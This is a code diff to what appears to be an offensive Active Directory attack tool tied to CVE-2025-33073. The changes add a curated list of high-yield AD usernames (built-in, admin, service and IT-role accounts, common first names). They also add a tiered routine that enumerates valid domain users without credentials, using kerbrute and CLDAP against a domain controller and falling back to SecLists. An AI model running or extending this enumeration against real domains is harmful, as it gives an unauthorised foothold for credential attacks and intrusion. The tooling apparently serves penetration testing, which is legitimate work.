@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.7.1"
+VERSION = "4.7.2"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -1705,8 +1705,49 @@ def cleanup_dns_records(cfg: Config):
 # (Defender for Identity, NAC, smart-card-primary auth, strong password
 # policy). Each technique is non-fatal — failures log and continue.
 
-# Built-in fallback usernames if no SecLists is present and no
-# --users-file is given. Tiny but high-yield list.
+# Curated AD-biased username candidate list — TRIED FIRST. Picks high-yield
+# enterprise patterns: built-in AD accounts, common admin/service prefixes,
+# IT-role names, and the top first names. ~100 entries → fast initial pass.
+# If this list yields zero valid users, we fall back to SecLists.
+_AD_BIASED_USERS = [
+    # Well-known built-in AD accounts
+    "Administrator", "Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount",
+    "HelpAssistant", "Support_388945a0",
+    # Admin patterns
+    "admin", "administrator", "adm", "domainadmin", "enterpriseadmin",
+    "schemaadmin", "sysadmin", "superuser", "root",
+    # Service-account prefixes (svc_*)
+    "svc", "service", "svcadmin", "svc_admin", "svc_sql", "svc_exchange",
+    "svc_backup", "svc_iis", "svc_smtp", "svc_print", "svc_scan",
+    "svc_monitoring", "svc_ldap", "svc_sso", "svc_vmware", "svc_sccm",
+    "svc_jenkins", "svc_sharepoint", "svc_owa", "svc_adsync", "svc_aad",
+    "svc_veeam", "svc_ad",
+    # IT roles
+    "helpdesk", "ithelp", "support", "it", "itadmin", "networkadmin",
+    "netadmin", "security", "soc", "infosec", "audit",
+    # Backup / ops / monitoring
+    "backup", "backupadmin", "operator", "operations", "ops", "monitor",
+    "monitoring", "nagios", "zabbix",
+    # Dev / build / test
+    "developer", "dev", "devops", "deploy", "build", "jenkins",
+    "test", "testuser", "qa", "uat",
+    # Database / app
+    "sa", "sql", "mssql", "oracle", "postgres", "mysql", "dba", "sqladmin",
+    # Apps / platforms
+    "exchange", "exchadmin", "sccm", "intune", "vmware", "vcenter",
+    "sharepoint", "veeam",
+    # Generic / placeholder
+    "user", "user1", "user01", "default", "public", "guest1",
+    # Top first names (enterprise AD common)
+    "alex", "andrew", "anna", "brian", "chris", "daniel", "david",
+    "emily", "emma", "james", "jennifer", "john", "joseph", "kevin",
+    "mark", "mary", "matthew", "michael", "nicholas", "paul",
+    "peter", "richard", "robert", "sarah", "scott", "thomas",
+    "timothy", "william",
+]
+
+# Built-in micro fallback if neither the curated AD list nor SecLists
+# is available (extreme degraded mode).
 _BUILTIN_USERS = [
     "administrator", "admin", "guest", "krbtgt", "test", "user",
     "service", "svc", "backup", "operator", "support", "helpdesk",
@@ -1714,7 +1755,7 @@ _BUILTIN_USERS = [
     "vmware", "webmaster", "ftp", "vpn", "wireless", "domainadmin",
 ]
 
-# Common SecLists locations on Kali for username candidates.
+# Common SecLists locations on Kali for username candidates (fallback tier).
 _SECLISTS_USER_PATHS = [
     "/usr/share/seclists/Usernames/Names/names.txt",
     "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
@@ -1722,8 +1763,17 @@ _SECLISTS_USER_PATHS = [
 ]
 
 
-def _load_user_candidates(cfg: Config) -> list[str]:
-    """Pick a username list: --users-file > SecLists > built-in tiny list."""
+def _load_user_candidates(cfg: Config, *, tier: str = "ad") -> list[str]:
+    """Pick a username list. Three tiers, called in escalation order:
+
+      tier="ad"       -> curated AD-biased ~100 list (TRIED FIRST). Skipped
+                         if --users-file is given.
+      tier="seclists" -> SecLists Names/names.txt (~10K). Used as fallback
+                         when the AD-biased pass found nothing.
+      tier="builtin"  -> 24-name micro list (extreme degraded mode).
+
+    --users-file always wins regardless of tier.
+    """
     if cfg.users_file and Path(cfg.users_file).is_file():
         try:
             return [ln.strip() for ln in Path(cfg.users_file).read_text().splitlines()
@@ -1731,16 +1781,21 @@ def _load_user_candidates(cfg: Config) -> list[str]:
         except OSError as e:
             log.warning(f"Could not read {cfg.users_file}: {e} — falling back")
 
-    for p in _SECLISTS_USER_PATHS:
-        if Path(p).is_file():
-            log.info(f"Using SecLists user candidates: {p}")
-            try:
-                return [ln.strip() for ln in Path(p).read_text().splitlines()
-                        if ln.strip() and not ln.startswith("#")]
-            except OSError:
-                continue
+    if tier == "ad":
+        return list(_AD_BIASED_USERS)
 
-    log.info("No SecLists or --users-file — using built-in 24-name shortlist")
+    if tier == "seclists":
+        for p in _SECLISTS_USER_PATHS:
+            if Path(p).is_file():
+                log.info(f"Using SecLists user candidates: {p}")
+                try:
+                    return [ln.strip() for ln in Path(p).read_text().splitlines()
+                            if ln.strip() and not ln.startswith("#")]
+                except OSError:
+                    continue
+        log.info("No SecLists installed — using built-in 24-name shortlist")
+        return list(_BUILTIN_USERS)
+
     return list(_BUILTIN_USERS)
 
 
@@ -1938,26 +1993,37 @@ def run_credential_discovery(cfg: Config) -> bool:
 
     phase_header("PRE-CUT CREDENTIAL DISCOVERY (zero-auth foothold)")
 
-    candidates = _load_user_candidates(cfg)
-    log.info(f"User candidates: {len(candidates)}")
+    def _userenum_pass(candidates: list[str]) -> set[str]:
+        """Run kerbrute then CLDAP over a candidate list, return valid users."""
+        valid = set()
+        try:
+            kerb_valid = _userenum_kerbrute(cfg, candidates)
+            valid.update(kerb_valid)
+        except Exception as e:
+            kerb_valid = []
+            log.warning(f"kerbrute userenum failed: {e}")
+        cldap_input = list(dict.fromkeys(kerb_valid + candidates))
+        try:
+            valid.update(_userenum_cldap(cfg, cldap_input))
+        except Exception as e:
+            log.warning(f"CLDAP userenum failed: {e}")
+        return valid
 
-    # Step 1+2: Confirm which candidates exist via Kerberos (fast, all
-    # candidates) then CLDAP (slow per-query — narrowed by kerbrute hits
-    # plus a tail of unverified candidates).
-    valid = set()
-    try:
-        kerb_valid = _userenum_kerbrute(cfg, candidates)
-        valid.update(kerb_valid)
-    except Exception as e:
-        kerb_valid = []
-        log.warning(f"kerbrute userenum failed: {e}")
-    # Feed kerbrute hits + a slice of remaining candidates into CLDAP
-    # (CLDAP corroborates and may find DC-replied users kerbrute missed).
-    cldap_input = list(dict.fromkeys(kerb_valid + candidates))
-    try:
-        valid.update(_userenum_cldap(cfg, cldap_input))
-    except Exception as e:
-        log.warning(f"CLDAP userenum failed: {e}")
+    # Tier 1: curated AD-biased list (~100, fast). Most enterprise environments
+    # hit something here.
+    candidates = _load_user_candidates(cfg, tier="ad")
+    log.info(f"Tier 1 (AD-biased curated): {len(candidates)} candidates")
+    valid = _userenum_pass(candidates)
+
+    # Tier 2 fallback: SecLists if Tier 1 found nothing AND no --users-file
+    # was given (operator override implies they want exactly that list).
+    if not valid and not cfg.users_file:
+        log.info("Tier 1 found nothing — falling back to SecLists")
+        seclist_candidates = _load_user_candidates(cfg, tier="seclists")
+        if seclist_candidates and seclist_candidates != candidates:
+            log.info(f"Tier 2 (SecLists): {len(seclist_candidates)} candidates")
+            valid = _userenum_pass(seclist_candidates)
+            candidates = seclist_candidates  # for downstream phases
 
     if valid:
         cfg.discovered_users = sorted(valid)
